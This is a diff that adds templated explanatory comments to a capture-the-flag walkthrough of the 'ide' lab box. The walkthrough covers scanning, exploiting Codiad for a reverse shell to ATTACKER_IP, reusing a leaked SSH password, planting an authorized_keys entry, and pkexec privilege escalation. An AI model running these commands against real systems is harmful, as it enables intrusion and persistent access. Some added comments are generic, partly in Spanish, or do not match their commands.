@@ -43,11 +43,15 @@ pkexec + pkttyagent (dual SSH sessions) → Root Flag
 
 ### Host Setup
 ```bash
+# What it does: adds machine domains to /etc/hosts.
+# Why here: resolve virtual hosts during web enumeration.
 echo "TARGET_IP ide.thm" | sudo tee -a /etc/hosts
 ```
 
 ### Port Discovery
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sS -p- --min-rate 5000 -n TARGET_IP
 ```
 
@@ -55,6 +59,8 @@ nmap -sS -p- --min-rate 5000 -n TARGET_IP
 
 ### Service Enumeration
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sVC -p21,22,80,62337 TARGET_IP -oA service-scan
 ```
 
@@ -91,6 +97,8 @@ Also, please take care of the image file ;)
 ### Web Content Discovery — Port 62337
 
 ```bash
+# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
+# Why here: descubrir endpoints ocultos que abren la siguiente fase.
 feroxbuster -u http://TARGET_IP:62337/ \
   -w /usr/share/seclists/Discovery/Web-Content/big.txt
 ```
@@ -120,6 +128,8 @@ Login at `http://TARGET_IP:62337/`.
 
 **Step 1 — Obtain authenticated session cookie:**
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authenticate' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data-raw 'username=john&password=password&theme=default&language=en' \
@@ -128,11 +138,15 @@ curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authen
 
 **Step 2 — Set up listener:**
 ```bash
+# What it does: opens or uses a TCP connection/listener.
+# Why here: receive shell, transfer data or check connectivity.
 nc -lvnp 4444
 ```
 
 **Step 3 — Execute the exploit:**
 ```bash
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 49705.py http://TARGET_IP:62337 john password ATTACKER_IP 4444 linux
 ```
 
@@ -146,8 +160,14 @@ python3 49705.py http://TARGET_IP:62337 john password ATTACKER_IP 4444 linux
 
 ```bash
 id
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /etc/passwd | grep "bash"
+# What it does: searches the filesystem with the specified filters.
+# Why here: locate credentials, binaries, configs or writable paths.
 find / -name "*.conf" -o -name "config.php" 2>/dev/null | grep -E "config|.env"
+# What it does: filters text with the specified pattern.
+# Why here: extract the important clue from a large output.
 netstat -tulpn 2>/dev/null | grep LISTEN
 ```
 
@@ -155,11 +175,15 @@ netstat -tulpn 2>/dev/null | grep LISTEN
 
 Find files owned by `drac`:
 ```bash
+# What it does: searches the filesystem with the specified filters.
+# Why here: locate credentials, binaries, configs or writable paths.
 find / -user drac 2>/dev/null
 ```
 
 Read bash history:
 ```bash
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /home/drac/.bash_history
 ```
 
@@ -170,6 +194,8 @@ cat /home/drac/.bash_history
 ### SSH with Reused Credentials
 
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh drac@TARGET_IP
 # Password: Th3dRaCULa1sR3aL
 ```
@@ -205,11 +231,17 @@ Root shell in Session 1
 
 ```bash
 # On attacker machine
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_drac
 
 # On victim (as drac)
 mkdir -p /home/drac/.ssh
+# What it does: escribe una clave publica SSH en authorized_keys.
+# Why here: crear acceso SSH por clave para esa cuenta.
 echo "<attacker public key>" > /home/drac/.ssh/authorized_keys
+# What it does: changes permissions or owner.
+# Why here: make a payload executable or control access to a file.
 chmod 700 /home/drac/.ssh
 chmod 600 /home/drac/.ssh/authorized_keys
 ```
@@ -218,11 +250,15 @@ chmod 600 /home/drac/.ssh/authorized_keys
 
 **Terminal 1 (main session):**
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
 ```
 
 **Terminal 2 (agent session):**
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
 ```
 
@@ -230,6 +266,8 @@ ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
 
 ```bash
 # Get the PID of session 1's sshd process
+# What it does: filters text with the specified pattern.
+# Why here: extract the important clue from a large output.
 ps aux | grep sshd | grep drac | grep -v grep
 # Example output: root 12345 ... sshd: drac@pts/0
 
@@ -280,3 +318,5 @@ root@ide:/# cat /root/root.txt
 3. **Password reuse is dangerous** — A database password reused for SSH access is a critical risk
 4. **Expose minimum services** — Running Codiad on a non-standard port is not security; remove it from production
 5. **Restrict pkexec** — Polkit should be configured to prevent unprivileged users from elevating without explicit policy
+
+
